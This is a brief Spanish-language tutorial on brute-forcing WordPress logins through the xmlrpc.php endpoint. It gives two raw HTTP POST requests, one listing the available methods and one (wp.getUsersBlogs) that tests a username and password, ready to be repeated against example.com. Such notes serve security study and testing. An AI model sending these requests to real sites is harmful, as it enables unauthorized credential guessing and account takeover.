# Introduccion

El archivo **xmlrpc.php** es un archivo presente en las paginas hechas utilizando WordPress, este archivo puede ser llamado por una peticion POST, con una estructura de tipo xml, si se encuentra este archivo se podria realizar un ataque de fuerza bruta al mismo de la siguiente manera: 


Con la siguiente peticion por POST, vamos a pedir al archivo xmlrpc que nos liste todos los "metodos" que hay para poder hacer otro tipo de peticiones.

```bash
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

```bash
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>\{\{your username\}\}</value></param> 
<param><value>\{\{your password\}\}</value></param> 
</params> 
</methodCall>
```
